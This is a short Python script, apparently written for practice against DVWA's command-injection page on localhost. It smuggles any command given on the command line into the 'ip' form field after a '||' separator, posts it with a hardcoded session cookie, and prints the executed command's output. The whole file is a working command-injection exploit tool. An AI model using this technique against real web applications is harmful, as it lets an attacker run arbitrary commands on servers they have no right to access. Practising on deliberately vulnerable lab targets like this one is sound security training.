import requests
from bs4 import BeautifulSoup
import sys
command = sys.argv[1:]
command = " ".join(command)
target = "http://localhost/DVWA/vulnerabilities/exec/"
cookie = {"security":"medium", "PHPSESSID":"jh653d10n3f1lds138dv2t24bb"}
parameters = {"ip":"nasa.gov||{}".format(command),"Submit":"Submit"}
req = requests.post(url=target,data=parameters,cookies=cookie)
soup = BeautifulSoup(req.content,"html.parser")
raw_result = soup.find_all("pre")[0].text
raw_result = raw_result.split("\n")[4:]
for r in raw_result:
	print(r)
